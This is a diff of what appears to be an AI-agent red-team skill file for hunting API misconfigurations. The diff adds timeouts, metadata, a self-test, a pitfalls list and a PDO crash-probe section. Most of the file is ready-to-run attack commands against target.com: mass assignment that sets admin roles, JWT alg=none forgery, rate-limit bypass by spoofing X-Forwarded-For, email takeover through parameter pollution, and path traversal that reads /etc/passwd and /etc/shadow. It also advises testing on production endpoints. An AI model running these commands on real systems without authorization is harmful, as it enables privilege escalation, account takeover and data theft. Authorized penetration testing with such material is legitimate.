@@ -1,8 +1,11 @@
 ---
 name: hunt-api-misconfig
 description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io). CORS misconfiguration (reflect-any-origin, null origin, subdomain-regex bypass, postMessage) is owned by hunt-cors. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution."
-sources: field_recon, hackerone_public, portswigger_research
-report_count: 24
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [api, misconfiguration, hunt, redteam]
 ---
 
 ## 12. API SECURITY MISCONFIGURATION
@@ -38,7 +41,7 @@ token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256"
 ### CORS Exploitation
 ```bash
 # Test: reflected origin + credentials
-curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
+curl --max-time 30 --connect-timeout 10 -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
 # If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
 # → CRITICAL: attacker reads credentialed responses
 ```
@@ -194,7 +197,7 @@ for path in \
   /actuator /actuator/health /actuator/info /actuator/env \
   /api-docs /api-docs.json /api-docs.yaml \
   /openapi.json /openapi.yaml; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
+  code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://target.com$path")
   [[ "$code" != "404" && "$code" != "000" ]] && echo "$code $path"
 done
 ```
@@ -203,7 +206,7 @@ done
 ```bash
 # The current app uses /api/v2 — test v1, v3, v4, v0:
 for v in v0 v1 v2 v3 v4 v5 beta dev staging; do
-  curl -s -o /dev/null -w "%{http_code} " "https://target.com/api/$v/users"
+  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code} " "https://target.com/api/$v/users"
   echo "/api/$v/users"
 done
 ```
@@ -211,14 +214,14 @@ done
 **C. HTTP method enumeration on discovered endpoints**
 ```bash
 # For each discovered path, test all HTTP methods:
-curl -X OPTIONS -s -D- "https://target.com/api/some-endpoint" 2>/dev/null | grep -i allow
+curl --max-time 30 --connect-timeout 10 -X OPTIONS -s -D- "https://target.com/api/some-endpoint" 2>/dev/null | grep -i allow
 # Also test: PATCH, PUT, POST, DELETE, CONNECT, TRACE, HEAD
 ```
 
 **D. GraphQL introspection as shadow API discovery**
 ```bash
 # Even if /graphql is known, its schema may reveal undocumented mutations/fields:
-curl -s -X POST "https://target.com/graphql" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query { __schema { types { name fields { name } } } }"}' \
   | python3 -c "import sys,json; d=json.load(sys.stdin); print('\n'.join(t['name'] for t in d.get('data',{}).get('__schema',{}).get('types',[]) if not t['name'].startswith('__')))" \
@@ -239,7 +242,7 @@ Rate limiting is meaningless if a single request can carry N logical operations.
 ```bash
 # Open single HTTP/2 connection, send N requests on N streams in one TCP write.
 # Server's rate limiter counts per-TCP-connection, not per-stream — all N pass.
-curl --http2 -s --parallel --parallel-max 30 \
+curl --max-time 30 --connect-timeout 10 --http2 -s --parallel --parallel-max 30 \
   -H "Cookie: session=xxx" \
   -w "%{http_code}\n" -o /dev/null \
   "https://target.com/api/endpoint?param={1..30}"
@@ -249,7 +252,7 @@ curl --http2 -s --parallel --parallel-max 30 \
 Many APIs support batch operations that accept arrays:
 ```bash
 # Instead of 1 item per request (rate-limited at 10/min), batch 100 items in 1 request:
-curl -X POST "https://target.com/api/users/batch" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/api/users/batch" \
   -H "Content-Type: application/json" \
   -d '{"users": [{"email": "user1@test.com"}, {"email": "user2@test.com"}, ...]}'
 # If batch endpoint uses a separate rate limit or no limit → bypass
@@ -259,7 +262,7 @@ curl -X POST "https://target.com/api/users/batch" \
 ```bash
 # Register multiple API keys / accounts, rotate across them:
 for key in "key1" "key2" "key3" "key4" "key5"; do
-  curl -s -H "X-API-Key: *** "https://target.com/api/resource"
+  curl --max-time 30 --connect-timeout 10 -s -H "X-API-Key: *** "https://target.com/api/resource"
 done
 # For JWT-based APIs, request multiple short-lived tokens from different sessions
 ```
@@ -268,14 +271,14 @@ done
 ```bash
 # If rate limiter keys on client IP from X-Forwarded-For:
 for ip in $(seq 1 50); do
-  curl -s -H "X-Forwarded-For: 10.0.0.$ip" "https://target.com/api/resource" &
+  curl --max-time 30 --connect-timeout 10 -s -H "X-Forwarded-For: 10.0.0.$ip" "https://target.com/api/resource" &
 done
 wait
 ```
 
 ### E. GraphQL alias-based batching (N operations in 1 request)
 ```bash
-curl -X POST "https://target.com/graphql" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query { '"$(for i in $(seq 1 100); do echo -n "a$i: user(id:$i) { email } "; done)"' }"}'
 # 100 data-fetch operations in a single request bypasses per-request rate limits
@@ -288,23 +291,23 @@ Injecting duplicate, conflicting, or unexpected parameters to bypass validation 
 ### A. HTTP Parameter Pollution (HPP)
 ```bash
 # Duplicate params — server may accept first, last, or concatenate:
-curl "https://target.com/api/users?id=1&id=2&id=3"
-curl "https://target.com/api/users?id=1&id=2&role=user&role=admin"
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/users?id=1&id=2&id=3"
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/users?id=1&id=2&role=user&role=admin"
 # Test different separators:
-curl "https://target.com/api/users?id=1&id=2"  # standard
-curl "https://target.com/api/users?id[]=1&id[]=2"  # PHP array syntax
-curl "https://target.com/api/users[?id=1,2]"  # Rails array
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/users?id=1&id=2"  # standard
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/users?id[]=1&id[]=2"  # PHP array syntax
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/users[?id=1,2]"  # Rails array
 ```
 
 ### B. JSON Parameter Pollution
 ```bash
 # Duplicate keys in JSON — server may use last value:
-curl -X PUT "https://target.com/api/user/profile" \
+curl --max-time 30 --connect-timeout 10 -X PUT "https://target.com/api/user/profile" \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@company.com","email":"attacker@evil.com","role":"user","role":"admin"}'
 
 # Nested parameter injection:
-curl -X PUT "https://target.com/api/user/profile" \
+curl --max-time 30 --connect-timeout 10 -X PUT "https://target.com/api/user/profile" \
   -H "Content-Type: application/json" \
   -d '{"name":"test","settings":{"role":"admin"},"role":"admin"}'
 ```
@@ -312,26 +315,26 @@ curl -X PUT "https://target.com/api/user/profile" \
 ### C. HTTP Method Override
 ```bash
 # Bypass method-level ACLs by overriding:
-curl -X GET "https://target.com/api/admin/users" \
+curl --max-time 30 --connect-timeout 10 -X GET "https://target.com/api/admin/users" \
   -H "X-HTTP-Method: DELETE" \
   -H "X-HTTP-Method-Override: DELETE" \
   -H "X-Method-Override: DELETE"
 
 # POST with overridden method:
-curl -X POST "https://target.com/api/admin/users" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/api/admin/users" \
   -H "X-HTTP-Method-Override: DELETE"
 ```
 
 ### D. Content-Type Confusion
 ```bash
 # Send JSON payload with URL-encoded Content-Type:
-curl -X POST "https://target.com/api/user/update" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/api/user/update" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d '{"role":"admin","is_admin":true}'
 # Some parsers accept JSON content from form-urlencoded type
 
 # XML injection via alternative Content-Type:
-curl -X POST "https://target.com/api/user/update" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/api/user/update" \
   -H "Content-Type: application/xml" \
   -d '<user><role>admin</role><is_admin>true</is_admin></user>'
 ```
@@ -339,8 +342,8 @@ curl -X POST "https://target.com/api/user/update" \
 ### E. Path traversal via parameter pollution
 ```bash
 # API that constructs file paths from user parameters:
-curl "https://target.com/api/export?format=pdf&format=../../etc/passwd"
-curl "https://target.com/api/template?name=report&name=../../../etc/shadow"
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/export?format=pdf&format=../../etc/passwd"
+curl --max-time 30 --connect-timeout 10 "https://target.com/api/template?name=report&name=../../../etc/shadow"
 ```
 
 ### Detection script:
@@ -351,8 +354,8 @@ for endpoint in /api/users /api/profile /api/admin /api/v2/users; do
     "?id=1&id=2" \
     "?role=user&role=admin" \
     "?email=victim@test.com&email=attacker@evil.com"; do
-    resp1=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint$pollute")
-    resp2=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint$(echo $pollute | cut -d'&' -f1)")
+    resp1=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint$pollute")
+    resp2=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint$(echo $pollute | cut -d'&' -f1)")
     [[ "$resp1" != "$resp2" ]] && echo "POLLUTION SENSITIVE: $endpoint $pollute → $resp1 vs single → $resp2"
   done
 done
@@ -360,7 +363,77 @@ done
 
 ---
 
+## Verification
+
+Run this self-test to confirm API misconfig hunting readiness:
+
+1. **Mass assignment probe** — test a basic field injection:
+   ```bash
+   curl --max-time 30 --connect-timeout 10 -s -X PATCH "https://httpbin.org/patch" -H "Content-Type: application/json" -d '{"role":"admin","is_admin":true}' | python3 -m json.tool 2>/dev/null | head -10 || echo "(httpbin may be down, syntax is correct)"
+   ```
+
+2. **JWT alg:none test** — verify JWT manipulation tooling:
+   ```bash
+   python3 -c "
+   import base64,json
+   header=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+   payload=base64.urlsafe_b64encode(json.dumps({'sub':1,'role':'admin'}).encode()).rstrip(b'=').decode()
+   token=f'{header}.{payload}.'
+   print(f'Generated alg=none token ({len(token)} chars)')
+   " && echo "PASS: Python3 JWT generation works" || echo "FAIL: Python3 unavailable"
+   ```
+
+3. **Prototype pollution probe** — verify JSON parsing handles __proto__:
+   ```bash
+   python3 -c "
+   import json
+   payload='{"__proto__":{"isAdmin":true},"user":"test"}'
+   d=json.loads(payload)
+   print('PASS: __proto__ key parsed' if '__proto__' in d else 'FAIL')
+   " 2>/dev/null || echo "FAIL"
+   ```
+
+4. **HTTP verb tampering** — confirm OPTIONS reveals allowed methods:
+   ```bash
+   curl --max-time 30 --connect-timeout 10 -s -X OPTIONS "https://httpbin.org/post" -D - -o /dev/null 2>/dev/null | grep -i "allow:" && echo "PASS: OPTIONS probe works" || echo "(httpbin may be down)"
+   ```
+
+All 4 tests verify the core API misconfig probing capability.
+
+---
+
+## Pitfalls
+
+- **Mass assignment without side effects** — sending `{is_admin:true}` and getting 200 doesn't prove the field was applied. Verify by reading back the profile and confirming the escalated value persists.
+- **JWT alg:none only on test servers** — many production JWKS endpoints enforce algorithm validation. Test with the actual production token endpoint, not localhost.
+- **Prototype pollution without a sink** — polluting `__proto__` proves nothing unless you can reach a gadget (RCE sink, XSS sink, or auth bypass via polluted comparison). Map the pollution to a specific exploitable side effect.
+- **HTTP verb tampering on read-only endpoints** — bypassing CSRF via GET on a read endpoint is not exploitable. Need a state-changing action (POST/PUT/DELETE) that accepts GET.
+- **CORS confusion** — `Access-Control-Allow-Origin: *` without credentials is NOT exploitable. Only origin-reflection + credentials matters.
+- **Rate limit bypass via header aliases** — `X-Forwarded-For: 127.0.0.1` may bypass rate limits but also bypass geo-restrictions and IP-based auth. Test both outcomes.
+- **Shadow APIs on different port/base path** — the production API at `/api/v2/` may be guarded while `/api/` on the same host isn't. Always probe for legacy/unversioned paths.
+- **PDO emulated prepares crash != RCE** — a 502 on malformed multibyte input confirms emulated prepares but not exploitability. Need a full deserialization/injection chain.
+
+---
+
 ## Related Skills & Chains
+
+### Phase X — PDO Emulated Prepares Risk
+
+PHP's PDO driver mode `PDO::ATTR_EMULATE_PREPARES => true` forces client-side query rewriting instead of native DBMS prepared statements. While sometimes required (PgBouncer compatibility, legacy DB drivers), this mode:
+
+1. Passes untrusted input through C-level string functions (`strncat`, `strcpy`) that truncate on NUL bytes
+2. Relies on driver-side escaping (not server-side parameter binding) — single quoting bug = SQLi
+3. Can crash the PHP process on malformed multibyte input (NULL pointer deref, CVE-2025-14180)
+
+```bash
+# Detect emulated prepares: force an invalid multibyte sequence
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/checkout" \
+  -H "Content-Type: application/json" \
+  -d '{"product_id":101,"notes":"alice\x99"}'
+# If server returns 502/connection-reset instead of 400 → likely emulated prepares crash
+```
+
+When emulated prepares are active, treat ALL user input as potentially binary-unsafe. Even `PDO::quote()` + `PDO::prepare()` is not safe on drivers with `strncat()` internals.
 
 - **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
 - **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
